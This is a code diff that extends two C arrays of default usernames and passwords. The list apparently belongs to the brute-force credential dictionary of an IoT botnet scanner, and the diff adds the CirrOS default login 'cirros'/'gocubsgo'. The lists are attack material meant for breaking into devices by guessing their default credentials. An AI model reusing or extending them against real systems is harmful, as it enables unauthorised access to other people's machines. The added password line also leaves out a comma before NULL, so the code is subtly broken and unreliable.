@@ -6,7 +6,7 @@ const char *usernames[] = {
 "guest", "cactiuser", "administrator", "888888", 
 "Administrator", "informix", "admin", 
 "supervisor", "admin1", "666666", 
-"root", "nagios", "support", "ubnt", "mother", NULL};
+"root", "nagios", "support", "ubnt", "mother", "cirros", NULL};
 
 const char *passwords[] = {
 "ETO_ZAGLYSHKA_NE_UDALAYT",
@@ -17,4 +17,4 @@ const char *passwords[] = {
 "cacti", "888888", "juantech", "1234", "synopass", "informix", "smcadmin", 
 "1111", "articon", "supervisor", "54321", "pass", "666666", "Zte521", 
 "klv1234", "default", "fucker", "nagiosxi", "nagios", "", 
-"zlxx.", "support", "XA1bac0MX", "ubnt", "7ujMko0vizxv", "vizxv", "rasberry", NULL};
+"zlxx.", "support", "XA1bac0MX", "ubnt", "7ujMko0vizxv", "vizxv", "rasberry", "gocubsgo" NULL};
